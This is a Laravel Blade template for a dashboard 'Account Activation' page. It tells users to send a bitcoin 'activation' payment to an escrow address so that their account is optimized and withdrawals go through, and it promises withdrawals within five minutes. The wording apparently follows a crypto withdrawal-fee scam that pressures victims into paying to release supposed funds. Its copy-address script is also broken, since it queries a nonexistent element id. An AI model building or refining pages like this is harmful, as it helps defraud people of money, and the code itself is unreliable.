@include('dashboard.header')

<div class="content-body">
    <div class="container-fluid">
        <div class="card">
            <div class="card-body">
                <h4>Account Activation</h4>
                <p>Your current status: <strong>{{ $activationStatus }}</strong></p>

                <div class="mt-4">
                    <p><strong>Escrow Address:</strong> <span id="escrowAddress">{{Auth::user()->crypto_address}}</span></p>
                    <button id="copyAddress" class="btn btn-primary">Copy Address</button>

                    <p class="text-muted mt-2">
                        Please make sure you send the required activation bitcoin link to your escrow activation network
                        address to activate your account in order to make it active for your account optimization and
                        successful withdrawal without delay.
                        <br>
                        <strong>Note:</strong> Withdrawal to any account is within 5 minutes. We're fast and reliable.
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.getElementById('copyAddress').addEventListener('click', function () {
        const address = document.getElementById('Auth::user()->crypto_address').textContent;
        navigator.clipboard.writeText(address).then(function () {
            alert('Address copied successfully!');
        });
    });
</script>

@include('dashboard.footer')